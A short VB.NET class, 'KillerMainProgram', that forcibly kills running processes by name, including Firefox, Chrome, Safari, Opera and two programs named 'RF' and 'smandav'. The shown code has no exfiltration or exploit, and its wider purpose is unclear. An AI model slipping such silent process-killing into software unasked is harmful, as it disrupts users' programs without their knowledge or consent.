#Region "import"
Imports System.IO
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Data.SqlClient
Imports System.Data
Imports System.Data.OleDb
Imports System.Net
Imports System.Net.Mail
Imports System.Text
Imports System.Reflection
Imports System.ComponentModel
Imports System.Threading
Imports System.Threading.Tasks
Imports AIOTClient
#End Region

Public Class KillerMainProgram

#Region "program"
    Sub pwinalterablestop()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "RF" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub smandav()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "smandav" Then
                proc.Kill()
            End If
        Next
    End Sub
#End Region

#Region "browser"
    Sub firefox()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "firefox" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub chrome()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "chrome" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub safari()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "safari" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub opera()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "opera" Then
                proc.Kill()
            End If
        Next
    End Sub
#End Region

End Class
